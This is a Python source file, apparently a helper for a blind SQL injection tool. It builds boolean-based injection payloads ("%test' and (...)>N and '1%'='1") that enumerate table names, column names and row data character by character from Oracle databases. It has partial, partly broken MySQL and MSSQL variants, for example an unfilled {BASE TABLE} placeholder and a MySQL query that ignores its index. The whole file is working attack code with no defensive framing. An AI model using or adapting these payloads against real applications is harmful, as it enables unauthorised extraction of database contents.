class attackQuerys:
    DB_table_count = {'oracle':"select count(TABLE_NAME) from user_tables",
                      'mysql':"select count(TABLE_SCHEMA) from information_schema.tables",
                      'mssql':"SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'"}
    DB_table_length = {'oracle':"select length(TABLE_NAME) from(select TABLE_NAME,rownum as rnum from user_tables) where rnum={rnum}",
                       'mysql':"select length(TABLE_SCHEMA) from information_schema.tables limit {rnum} offset 0",
                       'mssql':"SELECT LEN(TABLE_SCHEMA) FROM (SELECT TOP {rnum} TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES ORDER BY TABLE_SCHEMA) AS limited_tables"}
    DB_table_data = {'oracle':"select ASCII(substr(TABLE_NAME,{index},1)) from(select TABLE_NAME,rownum as rnum from user_tables)where rnum={rnum}",
                       'mysql':"SELECT ASCII(SUBSTRING((SELECT TABLE_SCHEMA), 1, 1)) from information_schema.tables limit {rnum} offset 0",
                       'mssql':"SELECT ASCII(SUBSTRING(TABLE_NAME, {index}, 1)) FROM (SELECT TABLE_NAME, ROW_NUMBER() OVER (ORDER BY TABLE_NAME) AS rnum FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = {BASE TABLE}) AS numbered_tables WHERE rnum = {rnum}"}

    DB_column_count= {'oracle':"select count(COLUMN_NAME) from user_tab_columns where TABLE_NAME={table_name}",
                      'mysql':'',
                      'mssql':''}
    DB_column_length= {'oracle':"select length(COLUMN_NAME) from (select COLUMN_NAME, rownum as rnum from user_tab_columns where TABLE_NAME={table_name}) where rnum={rnum}",
                      'mysql':'',
                      'mssql':''}
    DB_column_data= {'oracle':"select ascii(substr(COLUMN_NAME,{index},1)) from (select COLUMN_NAME, rownum as rnum from user_tab_columns where TABLE_NAME={table_name}) where rnum={rnum}",
                      'mysql':'',
                      'mssql':''}
    DB_data_count= {'oracle':"select count({column_name}) from {table_name}",
                      'mysql':"",
                      'mssql':""}
    DB_data_length= {'oracle':"select length({column_name}) from (select {column_name}, rownum as rnum from {table_name}) where rnum={rnum}",
                      'mysql':"",
                      'mssql':""}
    DB_data_data= {'oracle':"select ascii(substr({column_name},{index},1)) from (select {column_name}, rownum as rnum from {table_name}) where rnum={rnum}",
                      'mysql':"",
                      'mssql':""}

    def __init__(self, DB_type='oracle'):
        self.DB_type = DB_type
        self.search_word = 'test'
        self.min = 1
        self.max = 20
    
    

    def get_table_query(self,type,rnum=0):
        if type=='count':
            base_query = attackQuerys.DB_table_count[self.DB_type]
        elif type == 'length':
            base_query = attackQuerys.DB_table_length[self.DB_type]
            base_query= base_query.format(rnum=rnum)
        elif type== 'data':
            base_query = attackQuerys.DB_table_data[self.DB_type]
            base_query= base_query.format(index='{}',rnum=rnum)
        else:
            print("틀린 type 옵션 입니다. \n type : count, length, data")
            return ""
        return "("+base_query+")"
    
    def get_column_query(self,type,table_name="",rnum=0):
        if type=='count':
            base_query = attackQuerys.DB_column_count[self.DB_type]
            base_query = base_query.format(table_name=f"'{table_name}'")
        elif type == 'length':
            base_query = attackQuerys.DB_column_length[self.DB_type]
            base_query = base_query.format(table_name=f"'{table_name}'",rnum=rnum)
        elif type== 'data':
            base_query = attackQuerys.DB_column_data[self.DB_type]
            base_query = base_query.format(index='{}',table_name=f"'{table_name}'",rnum=rnum)
        else:
            print("틀린 type 옵션 입니다. \n type : count, length, data")
            return ""

        return "("+base_query+")"
    
    def get_data_query(self,type,table_name="",column_name="",rnum=0):
        if type=='count':
            base_query = attackQuerys.DB_data_count[self.DB_type]
            base_query=base_query.format(table_name=table_name,column_name=column_name)
        elif type == 'length':
            base_query = attackQuerys.DB_data_length[self.DB_type]
            base_query=base_query.format(table_name=table_name,column_name=column_name,rnum=rnum)
        elif type== 'data':
            base_query = attackQuerys.DB_data_data[self.DB_type]
            base_query=base_query.format(index='{}',table_name=table_name,column_name=column_name,rnum=rnum)
        return "("+base_query+")"
    
    
    
    def get_complete_query(self,query,value=0):
        query = query+">{}"
        query = query.format(value)
        return f"%{self.search_word}' and " +query+ " and '1%'='1"

        
